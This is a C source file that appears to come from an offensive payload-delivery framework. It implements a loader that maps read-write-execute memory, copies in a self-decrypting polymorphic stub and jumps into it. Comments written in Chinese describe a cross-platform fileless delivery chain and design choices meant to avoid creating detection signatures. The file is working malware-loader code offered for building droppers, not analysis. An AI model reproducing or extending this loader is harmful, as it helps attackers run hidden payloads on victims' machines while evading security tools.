/* DAYANJING v4 — 25_deploy / src/pic_exec.c
 *
 * PIC（位置无关机器码）载荷的落地执行。
 *
 * 为什么必须有这条路径，而不是只用 pk_mexec：
 *   pk_mexec 走 memfd_create + execveat，那是 Linux 独有的机制，
 *   Windows 上没有对应物。只支持它，等于整条投递链在 Windows 上不可用。
 *   PIC 路径是跨平台的那一条：Windows 侧对应
 *   VirtualAlloc(RW) → memcpy → VirtualProtect(RX/RWX) → 跳转。
 *
 * 与 dp_asm_exec 的分工（不可混用）：
 *   dp_asm_exec      —— 载荷是 ELF 容器，需 seed 解包，走 mexec 替换进程映像
 *   dp_asm_exec_pic  —— 载荷已是"自解密的多态存根 + 密文"，无需外部 seed，
 *                       直接映射执行；存根自己解密并跳进真正的载荷
 *   对 ELF 调用本函数会跳进 ELF 头（0x7f 'E' 'L' 'F'）崩溃。这是"能发现的
 *   失败"而非静默错误，故不做运行时类型嗅探——嗅探本身会变成新的特征面。
 *
 * 一个必须写清楚的取舍：本函数映射的是 RWX 页。
 *   原因不是图省事，而是存根的工作方式决定的：存根对密文做的是**原地**
 *   PRGA 解密，解密完成后直接 jmp 进同页内的明文载荷。也就是说"写密文"
 *   与"执行"发生在同一块内存上，无法拆成"先 RW 解密、再 RX 执行"两步。
 *   所有原地解密的多态壳都面临同一个约束，这是固有代价，不是实现缺陷。
 *   缓解：执行结束后若载荷返回，立即 munmap，不残留可执行匿名映射。
 */

#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "drop.h"

/* 函数指针与对象指针之间的转换在 ISO C 里未定义；用联合避开 -Wpedantic，
   同时不引入编译器的非标准扩展。 */
typedef void (*dp_entry_fn)(void);

int dp_asm_exec_pic(const dp_asm_t *a)
{
    if (!a) return DP_ERR_ARG;
    /* 硬规则 2 的落点：未 seal 绝不执行。缺块却跳进去，现场表现为
       "制品随机跑飞"，是所有故障里最难定位的一类。 */
    if (!a->sealed) return DP_ERR_INCOMPLETE;
    if (!a->buf || a->len == 0) return DP_ERR_ARG;

    size_t map_len = ((size_t)a->len + 4095u) & ~(size_t)4095u;
    if (map_len == 0) return DP_ERR_ARG;

    void *mem = mmap(NULL, map_len, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) return DP_ERR_NOMEM;

    memcpy(mem, a->buf, (size_t)a->len);

    union { void *p; dp_entry_fn f; } u;
    u.p = mem;
    u.f();

    /* 只有当载荷主动返回时才会走到这里（多数载荷会 exec/exit 终结进程）。 */
    munmap(mem, map_len);
    return DP_OK;
}
